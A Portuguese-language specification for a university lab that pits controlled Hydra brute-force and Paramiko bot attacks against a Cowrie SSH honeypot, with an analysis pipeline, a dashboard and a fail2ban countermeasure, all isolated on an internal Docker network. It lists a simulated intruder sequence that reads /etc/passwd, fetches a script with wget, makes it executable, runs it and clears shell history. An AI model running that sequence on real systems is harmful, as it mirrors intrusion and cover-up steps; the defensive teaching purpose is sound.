# Especificação: Laboratório de Honeypot SSH com painel de ataques e contramedida

## 1. Título e resumo

**Honeypot SSH (Cowrie) com geração controlada de ataques, pipeline de análise, painel Streamlit e contramedida com fail2ban.**

Construir, em um único `docker compose up`, um laboratório isolado em que containers atacantes executam força bruta (Hydra) e sessões pós-login (Paramiko) contra um honeypot Cowrie. Os logs JSON são ingeridos em SQLite por um `analyzer` Python e exibidos em um painel Streamlit quase em tempo real. Um servidor OpenSSH real com fail2ban (`hardened-ssh`) demonstra a contramedida. Um roteiro automatizado (`make demo`) executa o ciclo ataque → captura → visualização → bloqueio em 6 a 7 minutos.

Documento de origem: [PROJETO_HONEYPOT_SPEC.md](../../PROJETO_HONEYPOT_SPEC.md).

## 2. Contexto e motivação

- **Disciplina:** Segurança Computacional, UFPB (Centro de Informática), prof. Iguatemi E. Fonseca. Equipe: Tobias Freire e Luis Antonio.
- **Prazos:** prévia de 5 min em **25/11/2026** (a spec foi escrita em 24/11, a prévia é no dia seguinte) e apresentação final de 12 a 15 min em **07/12/2026**, com demonstração ao vivo.
- **Conteúdos relacionados:** Cap. 6 (software malicioso, botnets, honeypots), Cap. 3 (autenticação, ataques de dicionário, bloqueio de conta), Cap. 1 (ameaças e contramedidas, tríade CIA) e Cap. 2 (hash SHA-256 para identificar arquivos).
- **Perguntas a responder:** quais credenciais os atacantes tentam primeiro; quantas tentativas por minuto/hora e por origem; o que fazem após "entrar"; quanto tempo leva o bloqueio com a contramedida e qual o efeito sobre o ataque.
- **Por que agora:** o grupo precisa de um artefato demonstrável na prévia (Fase 1) e de um laboratório completo e ensaiado na apresentação final.

## 3. Objetivos

1. Laboratório reproduzível, isolado e seguro, iniciado por `make up`.
2. Honeypot que registra conexões, logins, comandos e downloads em JSON.
3. Geradores de ataque controlados, restritos por lista branca ao próprio laboratório.
4. Pipeline idempotente de ingestão (JSONL → SQLite) com métricas e classificação de comportamento.
5. Painel em português, com atualização automática e modo apresentação.
6. Contramedida demonstrável (fail2ban) com métricas comparáveis ao honeypot.
7. Demo completa em ≤ 7 min, com plano B offline (logs gravados).
8. Documentação (README, DIARIO, ARQUITETURA, ROTEIRO_DEMO, RESULTADOS) para a apresentação.

## 4. Não objetivos

- Expor o honeypot à internet, usar VM descartável, GeoIP real, ELK/Grafana, VirusTotal ou honeypot Telnet ativo (tratados apenas como extensões futuras).
- Machine learning: a classificação é por regras.
- Atacar qualquer máquina fora do laboratório.
- Escrever malware, exploits ou código ofensivo além de Hydra e sessões SSH com comandos inofensivos.
- Executar de fato comandos ou binários baixados pelo atacante.
- Alta disponibilidade, autenticação do painel, multiusuário.

## 5. Requisitos

### 5.1 Infraestrutura e segurança

- **R1.** O laboratório deve subir com `docker compose up -d` (e `make up`), sem passos manuais além de copiar `.env.example` para `.env`.
- **R2.** Os serviços de ataque e alvo devem estar em uma rede Docker `lab_net` com `internal: true`.
- **R3.** Nenhum serviço, exceto o `dashboard`, deve publicar portas no host; o dashboard deve publicar somente em `127.0.0.1:8501`. Verificável por `docker ps` / `docker compose ps`.
- **R4.** Todas as imagens devem ter versão fixada (tag) no `docker-compose.yml`, inclusive `cowrie/cowrie`.
- **R5.** Os scripts de ataque (`bruteforce.sh`, `post_login_bot.py`, `run_scenario.py`) devem recusar, com mensagem clara em português e código de saída ≠ 0, qualquer alvo ausente de `lab/allowed_targets.txt`.
- **R6.** Arquivos baixados pelo atacante devem ficar apenas em `data/cowrie/downloads`, sem permissão de execução, e jamais ser executados.
- **R7.** O `.gitignore` deve excluir segredos, `.env`, `data/` (exceto `data/samples/`), listas de senhas externas e logs reais.
- **R8.** Todo script deve oferecer `--help`, retornar código de saída correto e não usar caminhos absolutos da máquina do autor.

### 5.2 Honeypot (Cowrie)

- **R9.** O Cowrie deve escutar SSH na porta `2222` dentro da rede, com hostname `srv-backup01` e banner de OpenSSH comum; Telnet (`2223`) deve vir desligado.
- **R10.** O Cowrie deve gravar `cowrie.json` (`[output_jsonlog]`) em `data/cowrie/log`.
- **R11.** O `userdb.txt` deve aceitar apenas as combinações `root:123456`, `admin:admin`, `pi:raspberry`, `ubuntu:ubuntu` e rejeitar as demais.
- **R12.** O honeypot deve registrar os eventos `session.connect`, `session.closed`, `client.version`, `login.failed`, `login.success`, `command.input`, `command.failed`, `session.file_download` e `session.file_upload`.

### 5.3 Geração de ataques

- **R13.** `attack/bruteforce.sh <alvo> [--users] [--passwords] [--threads]` deve executar Hydra contra o alvo, com listas versionadas `users.txt` (≈ 30 entradas) e `passwords.txt` (≈ 300 entradas); deve aceitar arquivo externo opcional não versionado.
- **R14.** `attack/post_login_bot.py` (Paramiko) deve autenticar com credencial válida e executar a sequência inofensiva: `uname -a`, `cat /proc/cpuinfo`, `whoami`, `cat /etc/passwd`, `ls -la`, `wget http://<servidor>/sample.sh`, `chmod +x sample.sh`, `./sample.sh`, `history -c`.
- **R15.** O bot deve aceitar parâmetros de número de sessões, intervalo, perfil (`noisy`, `stealthy`) e semente aleatória; com a mesma semente, a sequência e os intervalos devem ser idênticos.
- **R16.** Um servidor HTTP no container atacante deve servir um `sample.sh` inofensivo (somente `echo "fake payload"`), de modo que o download gere evento com SHA-256.
- **R17.** `attack/run_scenario.py <cenario>` deve executar cenários YAML: `baseline`, `distributed` (attacker1 e attacker2 em paralelo), `stealth` e `against_hardened`.
- **R18.** `attacker1` e `attacker2` devem ter IPs distintos em `lab_net`.

### 5.4 Pipeline de análise

- **R19.** O `analyzer` deve acompanhar `cowrie.json` continuamente (tail), tolerando rotação do arquivo e linhas JSON incompletas, e gravar em `data/analysis/honeypot.db`.
- **R20.** O esquema SQLite deve conter `events(id, ts, session, eventid, src_ip, username, password, command, url, sha256, raw_json)` e `sessions(session, src_ip, start_ts, end_ts, duration_s, login_success, client_version)`, com índices em `ts`, `src_ip` e `eventid`.
- **R21.** A ingestão deve ser idempotente: reprocessar o mesmo arquivo não pode duplicar eventos (chave única pelo hash da linha).
- **R22.** Os eventos devem ser validados com `pydantic`; linhas inválidas devem ser contadas e registradas em log, sem interromper a ingestão.
- **R23.** O sistema deve oferecer métricas: top N usuários, senhas e pares; tentativas por minuto/hora e por IP; taxa de sucesso por origem; top comandos e sequência típica por sessão; arquivos baixados (URL, SHA-256, frequência); tempo entre a primeira tentativa e o primeiro sucesso por origem.
- **R24.** Cada sessão deve ser classificada por regras em `scanner`, `bruteforcer`, `intruder` ou `dropper`. Limiar proposto para `bruteforcer`: ≥ 5 `login.failed` na sessão ou na origem em 60 s (configurável).
- **R25.** A CLI deve oferecer `python -m analyzer ingest --log <arquivo>`, `report --out reports/relatorio.md` e `export --csv <pasta>`.
- **R26.** Deve haver testes `pytest` para parsing, idempotência, classificação e queries, usando `data/samples/cowrie_sample.json`.
- **R27.** A ingestão deve processar ≥ 5.000 eventos/s em máquina comum.

### 5.5 Painel

- **R28.** O painel Streamlit deve ser uma página única em português, com atualização automática a cada 5 s (configurável) e filtros por período e origem.
- **R29.** Deve conter: cartões de resumo; série temporal de tentativas por minuto; top 10 usuários, senhas e pares; tabela de origens com classificação e nome do container atacante (sem mapa); atividade pós-login com replay textual de uma sessão; arquivos capturados; comparativo honeypot vs. `hardened-ssh` com marca do instante do ban.
- **R30.** Os gráficos devem usar `plotly` ou `altair`, sem dependências de rede externa em tempo de execução.
- **R31.** O painel deve carregar em ≤ 3 s e permanecer responsivo com 100 mil eventos.
- **R32.** Deve existir modo "apresentação" (fontes maiores, menos controles) e modo "replay" que leia `data/samples/`.

### 5.6 Contramedida

- **R33.** O `hardened-ssh` deve usar OpenSSH real com `PasswordAuthentication yes`, `MaxAuthTries 3`, `LoginGraceTime 20`, e fail2ban com jail `sshd` (`maxretry=5`, `findtime=60`, `bantime=300`, configuráveis por `.env`).
- **R34.** O bloqueio deve ser efetivo dentro do laboratório: após o ban, o atacante deve receber *connection refused* ou *timeout* (verificável por teste automatizado).
- **R35.** Os usuários de teste devem ter senhas fortes; um usuário com senha fraca deve existir somente em cenário separado.
- **R36.** O experimento deve medir: tentativas até o ban, tempo até o ban, tentativas bloqueadas após o ban e senhas testadas com versus sem contramedida.
- **R37.** `pam_faillock`/`pam_pwquality` devem ser documentados; a ativação do `pam_faillock` é opcional (*should*).

### 5.7 Demo e documentação

- **R38.** `make up`, `make down`, `make attack`, `make report`, `make demo` e `make clean` devem existir.
- **R39.** `make demo` deve executar: baseline no honeypot, painel ao vivo, ataque ao hardened com ban e resumo final, em ≤ 7 min a partir de um laboratório já construído.
- **R40.** Deve existir `data/samples/` com uma rodada completa gravada (plano B).
- **R41.** Devem existir e ser atualizados ao fim de cada fase: `README.md` (pré-requisitos, comandos, solução de problemas), `docs/DIARIO.md`, `docs/ARQUITETURA.md`, `docs/ROTEIRO_DEMO.md` (tempos por etapa) e `docs/RESULTADOS.md` (tabelas, gráficos PNG, limitações).
- **R42.** `ruff` e `black` devem ser configurados, sem bloquear o avanço (*should*).

## 6. Fluxos e comportamento

**Fluxo principal (demo):**
1. `make up` sobe honeypot, atacantes, hardened-ssh, analyzer e dashboard.
2. O operador abre `http://127.0.0.1:8501`.
3. `run_scenario.py baseline` dispara Hydra contra `honeypot:2222`, depois executa o bot com credencial válida.
4. O Cowrie escreve em `cowrie.json`; o analyzer ingere; o painel atualiza os cartões, a série temporal, os top e as origens.
5. O operador mostra comandos capturados e o arquivo baixado com SHA-256.
6. `run_scenario.py against_hardened` ataca o `hardened-ssh`; o fail2ban bane o IP e o ataque passa a receber recusa.
7. O painel exibe o comparativo com a marca do ban; `make report` gera o relatório.

**Fluxos alternativos e de erro:**
- Alvo fora da lista branca: o script imprime a recusa e sai com código 2, sem enviar tráfego.
- Docker ou rede falha na apresentação: usar o painel em modo replay com `data/samples/`.
- Analyzer reiniciado: retoma a leitura sem duplicar eventos.
- Banco ausente ou vazio: o painel exibe aviso "sem dados ainda" em vez de erro.

## 7. Casos de borda e tratamento de erros

- Linha JSON truncada no fim do arquivo: aguardar o restante; se persistir, descartar e contar.
- Rotação ou truncamento de `cowrie.json`: reabrir o arquivo (detecção por inode/tamanho).
- Evento com campo ausente (ex.: `command.input` sem `input`): armazenar com nulos, sem falhar.
- Senhas vazias ou com caracteres Unicode/aspas nas listas e nos comandos: escapar corretamente no Hydra e no SQL (consultas parametrizadas).
- Permissões de volume entre o usuário do Cowrie (uid 999) e o host: documentar e tratar no Makefile.
- Hydra contra o Cowrie: o servidor aceita só 4 combinações, então o sucesso depende de elas constarem nas wordlists (garantir isso).
- Dois atacantes simultâneos: os eventos entram intercalados; as sessões são separadas por `session`.
- Fail2ban com `bantime` expirado durante a demo: o cenário deve reiniciar o estado (`fail2ban-client unban --all`) antes de rodar.
- Banco com 100 mil eventos: consultas agregadas com índices e cache de dados no Streamlit.

## 8. Abordagem técnica

**Componentes e arquivos** (estrutura da seção 10 do documento de origem): `docker-compose.yml`, `Makefile`, `honeypot/etc/{cowrie.cfg,userdb.txt}`, `attack/`, `hardened/`, `analyzer/`, `dashboard/`, `lab/allowed_targets.txt`, `data/`, `reports/`, `docs/`.

**Decisões-chave:**
- **Rede e painel:** uma rede `internal: true` não permite publicar portas no host. O `dashboard` precisará de uma segunda rede (`host_net`, não interna) para publicar em `127.0.0.1:8501` e também estar na `lab_net` ou apenas ler o SQLite por volume. Recomendação: o dashboard fica **somente** em `host_net` e lê o SQLite por volume (sem acesso aos alvos).
- **Atacantes e internet:** atacantes ficam só na `lab_net` (sem internet); imagens são obtidas no build.
- **Servidor de `sample.sh`:** roda dentro de cada container atacante (porta 8000); o honeypot faz o `wget` pela `lab_net`. O hostname usado no `wget` deve constar na lista branca.
- **Ban do fail2ban:** ação `iptables` (`iptables-nft`) no próprio container com `cap_add: NET_ADMIN`. Alternativa descartada: ban no host (quebra o isolamento e a reprodutibilidade).
- **Comparativo no painel:** o `hardened-ssh` não gera `cowrie.json`. O analyzer precisa de um segundo adaptador que leia o `auth.log` do sshd e o log do fail2ban (ou eventos já normalizados para o mesmo esquema, com um campo `sensor`). Recomendação: acrescentar a coluna `sensor` em `events` e criar o `ingest_hardened`.
- **Ingestão contínua:** processo único com `tail` e lotes de inserção (`executemany` em transações de ~1.000 linhas), SQLite em modo WAL para o painel ler enquanto o analyzer escreve.
- **Idempotência:** coluna `line_hash` (SHA-256 da linha) com `UNIQUE`; `INSERT OR IGNORE`.
- **Classificação:** função pura em `classify.py`, testável isoladamente.
- **Cenários:** YAML com alvo, ferramenta, parâmetros e semente; o `run_scenario.py` valida o alvo antes de qualquer ação.

**Fases (da seção 12 do documento de origem):** (1) ambiente e honeypot, meta 25/11; (2) geração de ataques; (3) pipeline; (4) painel; (5) contramedida; (6) demo e polimento, meta 07/12. Divisão sugerida: Tobias (infraestrutura, Cowrie, ataques, fail2ban) e Luis Antonio (analyzer, SQLite, painel, relatório), com módulos independentes para o trabalho em paralelo.

## 9. Requisitos não funcionais

- **Segurança:** isolamento de rede; ausência de portas expostas; lista branca de alvos; quarentena sem execução; contêineres sem `--privileged` (apenas `NET_ADMIN` no `hardened-ssh`); sem segredos versionados.
- **Desempenho:** ingestão ≥ 5.000 eventos/s; painel ≤ 3 s com 100 mil eventos.
- **Compatibilidade:** Linux com Docker Engine e Compose v2, Make. Python 3.12.
- **Observabilidade:** o analyzer registra no log contagens de eventos ingeridos, ignorados e inválidos.
- **Reprodutibilidade:** versões fixas de imagens e dependências (`requirements.txt` / `pyproject.toml` com versões).
- **Idioma:** documentação, comentários e mensagens em português; identificadores em inglês.

## 10. Critérios de aceite

**Fase 1**
- [ ] `docker compose up -d` sobe o honeypot e o `attacker1` (R1, R2, R4).
- [ ] `docker compose exec attacker1 ssh root@honeypot -p 2222` conecta (R9, R11).
- [ ] Uma tentativa de login gera linhas em `data/cowrie/log/cowrie.json` (R10, R12).
- [ ] `docker ps` não mostra portas do honeypot publicadas no host (R3).

**Fase 2**
- [ ] O cenário `baseline` gera `login.failed`, `login.success`, `command.input` e `session.file_download` no log (R13 a R17).
- [ ] Alvo fora da lista branca é recusado com mensagem clara (R5).
- [ ] Mesma semente produz o mesmo comportamento do bot (R15).

**Fase 3**
- [ ] `pytest` verde (R26).
- [ ] Reingestão do mesmo arquivo não duplica eventos (R21).
- [ ] `python -m analyzer report` gera `reports/relatorio.md` com top usuários/senhas, séries por minuto e classificação das sessões (R23, R24, R25).
- [ ] Benchmark de ≥ 5.000 eventos/s (R27).

**Fase 4**
- [ ] Com `distributed` em execução, o painel mostra dois IPs de origem e os números mudam sem recarregar (R28, R29, R18).
- [ ] Modo replay funciona com `data/samples/` (R32).
- [ ] Modo apresentação disponível; 100 mil eventos carregam em ≤ 3 s (R31, R32).

**Fase 5**
- [ ] O ataque ao `hardened-ssh` é banido após ≤ 5 falhas em 60 s e passa a receber recusa/timeout (R33, R34).
- [ ] O painel mostra o comparativo com o instante do ban (R29, R36).

**Fase 6**
- [ ] `make demo` roda do zero em ≤ 7 min (R39).
- [ ] Plano B com logs gravados em `data/samples/` (R40).
- [ ] README, DIARIO, ARQUITETURA, ROTEIRO_DEMO e RESULTADOS completos, com limitações documentadas (R41).

## 11. Premissas e questões em aberto

**Premissas adotadas**
- A pasta `projeto_final/` é a raiz do projeto (o arquivo de origem a nomeia `honeypot-ssh/`); a estrutura é criada diretamente nela.
- Ambiente de desenvolvimento: Linux com Docker e Compose v2 já instalados.
- O `data/samples/` é versionado (exceção no `.gitignore`), pois é o plano B da demo.
- Os logs de exemplo são gerados no próprio laboratório, sem dados pessoais.
- O dashboard lê o SQLite por volume, sem acessar a `lab_net`.

**Questões em aberto**
1. Como o comparativo do painel obterá os dados do `hardened-ssh` (adaptador de `auth.log` + log do fail2ban com coluna `sensor`, como recomendado)?
2. O `hostname` do servidor de `sample.sh` será o nome do container atacante ou um alias `lab-fileserver` na `lab_net`?
3. A tag da imagem do Cowrie a fixar (a verificar no registro durante a Fase 1) e o uid de escrita dos volumes.
4. `pam_faillock` será ativado (R37) ou só documentado?
5. Há data para entregar slides e relatório escrito, além das apresentações?
6. Como a prévia é amanhã (25/11), o escopo mínimo a mostrar é a Fase 1 completa (e, se possível, parte da Fase 2); confirmar.
